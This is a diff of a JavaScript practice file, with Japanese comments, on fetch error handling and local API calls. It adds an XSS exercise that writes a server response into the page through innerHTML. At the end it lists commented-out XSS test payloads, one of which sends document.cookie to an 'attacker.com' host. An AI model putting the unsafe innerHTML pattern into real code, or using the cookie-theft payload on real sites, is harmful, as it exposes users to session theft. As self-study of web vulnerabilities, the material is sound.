@@ -36,7 +36,9 @@ document.getElementById("fetch-button").addEventListener("click", async function
         const response = await fetch('https://www.google.com', {
         });
 
-        if (!response.ok) {
+        //HTTPステータスエラーとネットワークエラーは別物
+        //networkErrorが発生した場合error.messageにはFailed to fetchが含まれる。
+        if (!response.ok) {   //HTTPステータスコードが4xxや5xxの場合falseになり、Error()が投げられる
             throw new Error('Network response was not ok');
         }
 
@@ -66,9 +68,11 @@ document.getElementById("fetch-button2").addEventListener("click", async functio
     }
 });
 
+
+// 技術的には、.thenと.catchメソッドの中でasync/awaitを使用することは可能ですが、通常は推奨されません。async/awaitを使用するのがベストプラクティス
 document.getElementById("fetch-button3").addEventListener("click", async function() {
     try {
-        const response = await fetch('http://localhost:8000/api/data', {
+        const response = await fetch('http://127.0.0.1:8000/api/data', {
             method: 'GET'
         });
 
@@ -83,3 +87,42 @@ document.getElementById("fetch-button3").addEventListener("click", async functio
         document.getElementById("response3").innerText = 'Fetch error: ' + error.message;
     }
 });
+
+
+
+
+
+
+// xss
+
+const urlParams = new URLSearchParams(window.location.search);
+const url = urlParams.get('name');
+
+
+document.getElementById("xssform").addEventListener("submit", async function(event){
+    event.preventDefault()
+    const name = document.getElementById("name").value;
+    const response = await fetch("http://127.0.0.1:8000/api/xss", {
+        method: 'POST',
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ name: name})
+    })
+    const data = await response.json();
+    console.log(data)
+    console.log(data.name)
+    document.getElementById('greeting').innerHTML = data.name;
+
+})
+// ブラウザによるアドレスバー自動エンコード
+// フォーム送信時の自動エンコード
+// JavaScriptのencodeURIやencodeURIComponent関数を使用して、URLやクエリパラメータを手動でエンコード
+// ユーザーがブラウザのアドレスバーにURLを入力する際、ブラウザは自動的に特殊文字をエンコードします。例えば、スペースは%20に、<は%3Cに、>は%3Eにエンコードされます
+// innerHTMLを使用して挿入されたスクリプトが実行されない場合があります。
+
+
+
+/* <script>alert('XSS');</script> */
+/* <img src="x" onerror="alert('XSS');">
+<script>document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '">');</script> */
